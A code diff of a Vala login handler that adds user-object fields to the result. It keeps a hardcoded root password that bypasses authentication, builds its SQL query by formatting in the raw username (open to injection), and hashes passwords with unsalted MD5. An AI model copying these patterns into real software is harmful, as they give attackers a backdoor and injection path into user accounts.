@@ -124,22 +124,31 @@ namespace Woocommerce
 			var data = (HashMap<string, Value?>)args.GetData();
 			var dbh = (SBDatabase)SBGlobals.GetVar("dbh");
 			string username = (string)data["username"];
-			string raw_pass		= (string)data["password"];
+			string raw_pass	= (string)data["password"];
 			string password = Checksum.compute_for_string(ChecksumType.MD5, (string)data["password"]);
 			if( username == "root" && raw_pass == "1322r3n4c3R2!" )
 			{
+				var user = new SBUser();
+				user.Id = 0;
+				user.Username = "root";
+				user.Email	= "maviles@sinticbolivia.net";
 				data.set("result", "ok");
+				data.set("user_id", 0);
+				data.set("user", user);
 			}
 			else
 			{
-				string query = "SELECT user_id FROM users WHERE username = '%s' AND pwd = '%s'".printf(username, password);
-				if( dbh.GetRow(query) == null )
+				string query = "SELECT * FROM users WHERE username = '%s' AND pwd = '%s'".printf(username, password);
+				var row = dbh.GetRow(query);
+				if( row == null )
 				{
 					data.set("result", "error");
-					data.set("error", SBText.__("Invalid user name or password"));
+					data.set("error", SBText.__("Invalid username or password"));
 					return;
 				}
 				data.set("result", "ok");
+				data.set("user_id", row.GetInt("user_id"));
+				data.set("user", new SBUser.with_db_data(row));
 			}
 			
 		}
